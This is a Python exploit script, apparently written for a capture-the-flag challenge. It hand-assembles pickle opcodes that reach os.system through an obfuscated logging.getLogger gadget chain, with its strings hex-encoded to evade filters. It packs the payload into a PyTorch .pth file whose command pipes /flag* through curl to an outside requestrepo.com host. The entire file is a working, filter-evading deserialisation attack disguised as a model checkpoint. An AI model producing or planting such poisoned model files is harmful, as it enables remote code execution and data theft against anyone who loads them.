
import pickle
import pickletools
import struct
import io
import torch
import codecs

# V20 Strategy:
# 1. Use `logging.getLogger` (benign module).
# 2. Access `logging.getLogger.__globals__` via `getattr`.
# 3. Retrieve `os` from globals via `dict.get`.
# 4. Retrieve `system` from `os` via `getattr`.
# 5. Execute command.
# 6. ALL strings ("__globals__", "os", "system", "get") generated dynamically via hex decode.

class Payload:
    def __init__(self, cmd):
        self.cmd = cmd

    def get_payload(self):
        # Helper to generate code for hex decoding a string
        def push_string(s):
            # GLOBAL 'codecs' 'decode'
            # STRING hex(s)
            # STRING 'hex'
            # TUPLE2
            # REDUCE
            
            # Since we are writing raw opcodes, we construct bytes
            hex_s = codecs.encode(s.encode(), 'hex').decode()
            ops = b''
            ops += b'c' + b'codecs\ndecode\n'
            ops += b'(' # MARK
            ops += b'V' + hex_s.encode() + b'\n' # UNICODE string
            ops += b'V' + b'hex' + b'\n'
            ops += b't' # TUPLE
            ops += b'R' # REDUCE
            return ops

        # 1. Resolve `builtins.getattr` -> save to MEMO 1
        ops = b''
        ops += b'c' + b'builtins\ngetattr\n'
        ops += b'q\x01' # BINPUT 1

        # 2. Resolve `builtins.dict` -> get `get` method -> save to MEMO 2
        # We need `dict.get`.
        # getattr(dict, 'get')
        ops += b'c' + b'builtins\ngetattr\n' # (already have it, effectively)
        ops += b'(' 
        ops += b'c' + b'builtins\ndict\n' # dict class
        ops += push_string("get")          # "get"
        ops += b't'
        ops += b'R' 
        ops += b'q\x02' # BINPUT 2 (dict.get)

        # 3. Get `logging.getLogger` -> save to MEMO 3
        ops += b'c' + b'logging\ngetLogger\n'
        ops += b'q\x03' # BINPUT 3

        # 4. Get `logging.getLogger.__globals__` -> save to MEMO 4
        # getattr(logging.getLogger, "__globals__")
        ops += b'h\x01' # BINGET 1 (getattr)
        ops += b'('
        ops += b'h\x03' # BINGET 3 (logger)
        ops += push_string("__globals__") # "__globals__"
        ops += b't'
        ops += b'R'
        ops += b'q\x04' # BINPUT 4 (globals dict)

        # 5. Get `os` from globals -> save to MEMO 5
        # dict.get(globals, "os")
        ops += b'h\x02' # BINGET 2 (dict.get)
        ops += b'('
        ops += b'h\x04' # BINGET 4 (globals)
        ops += push_string("os") # "os"
        ops += b't' 
        ops += b'R'
        ops += b'q\x05' # BINPUT 5 (os module)

        # 6. Get `system` from `os` -> save to MEMO 6
        # getattr(os, "system")
        ops += b'h\x01' # BINGET 1 (getattr)
        ops += b'('
        ops += b'h\x05' # BINGET 5 (os)
        ops += push_string("system") # "system"
        ops += b't'
        ops += b'R'
        ops += b'q\x06' # BINPUT 6 (system func)

        # 7. Call system(cmd)
        ops += b'h\x06' # BINGET 6 (system)
        ops += b'('
        ops += b'V' + self.cmd.encode() + b'\n'
        ops += b't'
        ops += b'R'

        # 8. End
        ops += b'.'
        
        return ops

URL = "http://kv51o04m.requestrepo.com"
# Try to cat /flag directly.
CMD = f"sh -c 'cat /flag* | curl -X POST -d @- {URL}'"

# Adjust CMD for the challenge (standard flag location or exfil)
# Or simple "cat /flag > /app/static/flag.txt" if we can access output.
# Stick to curl as it's versatile.

# Generating the payload
payload_gen = Payload(CMD)
pickle_ops = payload_gen.get_payload()

# Wrap in Torch Zip
buffer = io.BytesIO()
torch.save(payload_gen, buffer) # This puts a dummy object
# We need to replace the pickle payload in the zip with our malicious one.

with open("nailong_payload_v20.pth", "wb") as f:
    # We construct a valid Zip file structure manually or use torch.save and replace
    # But torch.save structures the zip with specific files: 
    # archive/data.pkl
    # archive/version
    
    # Let's use torch.save to create a dummy, then `zipfile` to replace `archive/data.pkl`
    pass

import zipfile
import shutil

# Create dummy
dummy_path = "dummy_v20.pth"
torch.save([1,2,3], dummy_path)

# Repack
with zipfile.ZipFile(dummy_path, 'r') as zin:
    with zipfile.ZipFile("nailong_payload_v20.pth", 'w') as zout:
        for item in zin.infolist():
            if "data.pkl" in item.filename:
                # Write our payload
                zout.writestr(item, pickle_ops)
            else:
                zout.writestr(item, zin.read(item.filename))

print("[+] Generated nailong_payload_v20.pth with obfuscated logging.getLogger gadget chain.")
